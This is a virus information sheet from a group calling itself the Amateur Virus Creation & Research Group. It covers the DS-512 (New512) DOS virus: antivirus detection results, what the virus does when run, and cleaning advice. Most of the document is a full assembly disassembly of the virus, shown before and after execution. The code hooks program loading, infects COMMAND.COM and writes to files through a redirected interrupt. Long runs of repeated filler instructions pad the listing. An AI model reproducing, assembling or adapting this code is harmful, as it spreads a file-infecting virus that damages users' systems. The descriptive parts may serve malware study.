       Distributed By Amateur Virus Creation & Research Group (AVCR)
Name:                  The DS-512(New512) Virus
-----------------------------------------------------------------------------
Alias: NEW512
-----------------------------------------------------------------------------
Type of Code: Non-Memory Resident ; Targets COMMAND.COM \ Boot sector
-----------------------------------------------------------------------------
Antivirus Detection:
(1)
ThunderByte Anti Virus (TBAV) reported NEW512.COM as: "Infected by DS-512
virus."
"No checksum / recovery information available."
"The program traps the loading of software.  Might be a virus that inter-
cepts program load to infect the software."
"Undocumented interrupt/DOS call.  The program might be just trickey
but can also be a virus using a non-standard way to detect itself."
"EXE/COM determination.  The program tries to check whether a file is
a COM or EXE file.  Viruses need to do this to infect a program."
"Found code that can be used to overwrite/move a program in memory."

(2)
Frisk Software's F-Protect (F-PROT) reported NEW512.COM as: "contains
unusual code, which is normally only found in viruses."

(3)
McAfee Softwares Anti Virus (SCAN.EXE) did not detect the DS-512 virus.

(4)
MicroSoft Anti Virus (MSAV.EXE) did not detect the DS-512 virus.
-----------------------------------------------------------------------------
Execution Results:
	When executed the DS-512 sends a beep to your speaker and
displays the text: "This is New 512 Virus .........!!!"  The computer's
speed is drastically reduced, due to the hard disk being used WILDLY!
The virus's Checksum is changed from 00DC to 0015.  Below are the
disassembled DS-512 virus BEFORE execution and AFTER the computer has
been reset!  Interestingly, when the computer is reset a third time the
checksum changes back from 0015 to 00DC and so does the virus's code, so
the third(+) time the computer is reset the DS-512 virus's code is the
same as BEFORE execution.
-----------------------------------------------------------------------------
Cleaning Recommendations:
	To clean the DS-512 virus we recommend replacing infected files, and
replacing the boot sector (use the SYS command).
-----------------------------------------------------------------------------
Researcher's Notes:
	None
-----------------------------------------------------------------------------
	     Disassembly of the DS-512 Virus BEFORE Execution
-----------------------------------------------------------------------------
		PAGE    60,132


data_ff         =       0FFh
data_205        =       205h
data_209        =       209h


; CODE_SEG_1

CODE_SEG_1      segment para public
		assume  CS:CODE_SEG_1, DS:CODE_SEG_1, SS:CODE_SEG_1, ES:CODE_SEG_1


		org     100h


;###############################################################################
;#
;#              ENTRY POINT
;#
;###############################################################################


;###############################################################################
;#
;#              PROCEDURE proc_start
;#
;###############################################################################

proc_start      proc    far
start:          ; N-Ref=0
		jmp     loc_2

		dw      758Bh, 30h, 0B8h, 0CD4Ch
var1_10b        db      '!This is New 512 Virus .........!!!'
		db      7, 24h, 0B4h, 9, 0BAh, 0Ch
		db      1, 0CDh, 21h
		db      11 dup (0)
loc_1:          ; N-Ref=0
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
loc_2:          ; N-Ref=2
		mov     DI,offset var1_100
		mov     SI,Word Ptr [DI+5]
		add     SI,DI
		mov     CX,7
		push    DS
		push    DI
		cld                             ; Clear direction flag
		push    CX
		push    SI
		repz    movsb                   ; Repeat if ZF = 1, CX > 0
						; Move byte from DS:SI to ES:DI
		xchg    CX,AX
		pop     DI
		pop     CX
		repz    stosb                   ; Repeat if ZF = 1, CX > 0
						; Store AL at ES:DI
		pop     DI
		push    DI
		mov     CH,8Ch
		mov     ES,CX

;###############################################################################
		assume  ES:nothing
;###############################################################################

		call    near ptr proc_1
proc_start      endp



;###############################################################################
;#
;#              PROCEDURE proc_1
;#
;###############################################################################

proc_1          proc    far
		pop     SI
		sub     SI,+20h
		nop                             ; 1 Fixup
		mov     CX,200h
		mov     DX,132h
		push    CX
		push    SI
		push    ES
		push    DX
		repz    movsb                   ; Repeat if ZF = 1, CX > 0
						; Move byte from DS:SI to ES:DI
		retf                            ; Return FAR
proc_1          endp



		dw      595Fh, 71Eh, 1F0Eh, 0AAF3h
		dw      13CDh, 8E06h, 0BFC1h, 4Ch
		dw      0ACB8h, 2601h, 587h, 0A8A3h
		dw      8C01h, 26C8h, 4587h, 0A302h
		dw      1AAh, 19B8h, 2602h, 4587h
		dw      0A338h, 215h, 0C88Ch, 8726h
		dw      3A45h, 17A3h, 2602h, 5DC5h
		dw      8175h, 903Fh, 7590h, 8B05h
		dw      85Fh, 1FC5h, 25B9h, offset loc_2
		db      0D9h
loop_loc_3:             ; N-Ref=2
		inc     BX
		cmp     Word Ptr [BX],0FC80h
		jne     loc_4                   ; Jump if not equal ( != )
		mov     AX,BX
loc_4:          ; N-Ref=1
		loop    loop_loc_3              ; Loop if CX > 0
		mov     DI,1C8h
		stosw                           ; Store AX at ES:DI
		mov     AX,DS
		stosw                           ; Store AX at ES:DI
		mov     AH,4Bh                  ; 'K'
		mov     DX,2F1h
		push    CS
		pop     DS
		int     21h                     ; DOS func ( ah ) = 4Bh
						; EXEC: Load/execute program
						;AL-subfnc DS:DX-ASCIIZ string
						; ES:BX-ptr to cntl block
						;AX-ret code
		pop     DS

;###############################################################################
		assume  DS:nothing
;###############################################################################

		push    DS
		pop     ES
		pop     DI
		push    DI
		cmp     Word Ptr [DI],5A4Dh
		jne     loc_5                   ; Jump if not equal ( != )
		mov     AH,4Ch                  ; 'L'
		int     21h                     ; DOS func ( ah ) = 4Ch
						; Terminate process
						;AL-ret code
loc_5:          ; N-Ref=1
		retf                            ; Return FAR

		dw      0EA9Dh, 5C0h, 0C9E3h, 2E9Ch
		dw      3E80h, 0FFh, 7500h, 80F1h
		dw      2FCh, 0EC75h, 0FF2Eh, 0A81Eh
		dw      9C01h, 0F72h, 1E60h, 0B591h
		dw      0E800h, 0Bh, 0C780h, 0E202h
		dw      1FF8h, 9D61h, 2CAh, 6000h
		dw      1F06h, 7F81h, 8B03h, 7575h
		dw      800Eh, 0E93Fh, 0B74h, 0B9h
		dw      0C602h, 7, 0E243h, 61FAh
		db      0C3h
loc_6:          ; N-Ref=0
		mov     DI,BX
		mov     SI,Word Ptr [DI+5]
		add     SI,DI
		mov     CL,7
		cld                             ; Clear direction flag
		repz    movsb                   ; Repeat if ZF = 1, CX > 0
						; Move byte from DS:SI to ES:DI
		mov     CL,7
		dec     SI
		mov     Byte Ptr [SI],CH
		loop    loc_notfound            ; Loop if CX > 0

		dw      0C361h, 0FDE9h, 8B01h, 3075h
		db      0
loc_7:          ; N-Ref=1
		mov     Byte Ptr DS:data_ff,0
		pop     ES
		pop     DS

		dw      9D61h, 9EEAh, 2310h, 9C01h
		dw      0FC80h, 754Bh, 60F4h, 61Eh
		dw      2B8h, 0CD3Dh, 0E72h, 721Fh
		dw      0FEE0h, 0FF06h, 9300h, 2B8h
		dw      3342h, 33C9h, 0CDD2h, 0B72h
		dw      75D2h, 0B82Bh, 4200h, 0C933h
		dw      72CDh, 3FB4h, 4B5h, 0BAh
		dw      8B03h, 0CDF2h, 3B72h, 75C1h
		dw      8115h, 37Ch, 758Bh, 0E74h
		db      0FCh, 83h, 0C6h, 7, 0B9h, 0F3h
		db      1
loop_loc_8:             ; N-Ref=2
		lodsb                           ; Load byte at DS:SI to AL
		or      AL,AL
		je      loc_9                   ; Jump if equal ( = )
		loop    loop_loc_8              ; Loop if CX > 0
		jmp     short loc_12
loc_9:          ; N-Ref=1

		dw      0B960h, 6, 0AACh, 75C0h
		dw      0E20Dh, 61F9h, 0EE81h, 301h
		dw      3689h, 209h, 3EBh, 0EB61h
		dw      0BAE3h, 200h
loc_10:         ; N-Ref=2
		mov     SI,500h
		mov     CX,200h
loop_loc_11:            ; N-Ref=1
		cmp     Byte Ptr [SI],DL
		jne     loc_13                  ; Jump if not equal ( != )
		inc     SI
		loop    loop_loc_11             ; Loop if CX > 0
		mov     AX,4200h
		int     72h
		sub     AX,3
		mov     Word Ptr DS:data_205,AX
		mov     AH,40h                  ; '@'
		mov     CX,200h
		inc     DH
		int     72h
		cmp     AX,CX
		jne     loc_14                  ; Jump if not equal ( != )
		mov     AX,4200h
		xor     CX,CX
		mov     DX,Word Ptr DS:data_209
		int     72h
		mov     AH,40h                  ; '@'
		mov     CL,7
		mov     DX,offset loc_2
		int     72h
		cmp     AX,CX
		jne     loc_14                  ; Jump if not equal ( != )
		mov     AX,4200h
		xor     CX,CX
		xor     DX,DX
		int     72h
		mov     AH,40h                  ; '@'
		mov     CL,7
		mov     DX,204h
		int     72h
loc_12:         ; N-Ref=1
		jmp     short loc_14
loc_13:         ; N-Ref=1
		add     DH,2
		push    DX
		mov     AH,3Fh                  ; '?'
		mov     CX,200h
		mov     DX,500h
		int     72h
		cmp     AX,CX
		pop     DX
		je      loc_10                  ; Jump if equal ( = )
loc_14:         ; N-Ref=3
		mov     AH,3Eh                  ; '>'
		int     72h
		jmp     loc_7

var1_4f1        db      '\COMMAND.COM'
		db      0
var1_4fe        db      44h, 53h
CODE_SEG_1      ends



		end     start
-----------------------------------------------------------------------------
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	    Disassembly of the DS-512 Virus AFTER It Was Executed
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-----------------------------------------------------------------------------

		PAGE    60,132




;########## CODE_SEG_1  ########################################################

CODE_SEG_1      segment para public
		assume  CS:CODE_SEG_1, DS:CODE_SEG_1, SS:CODE_SEG_1, ES:CODE_SEG_1


		org     100h


;###############################################################################
;#
;#              ENTRY POINT
;#
;###############################################################################


;###############################################################################
;#
;#              PROCEDURE proc_start
;#
;###############################################################################

proc_start      proc    far
start:          ; N-Ref=0
		mov     AH,9
		mov     DX,offset var1_10c
		int     21h                     ; DOS func ( ah ) = 9
						; Display string
						;DS:DX-output string
		mov     AX,4C00h
		int     21h                     ; DOS func ( ah ) = 4Ch
						; Terminate process
						;AL-ret code
proc_start      endp



var1_10c        db      'This is New 512 Virus .........!!!'
		db      7, 24h
		db      18 dup (0)
loc_1:          ; N-Ref=0
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
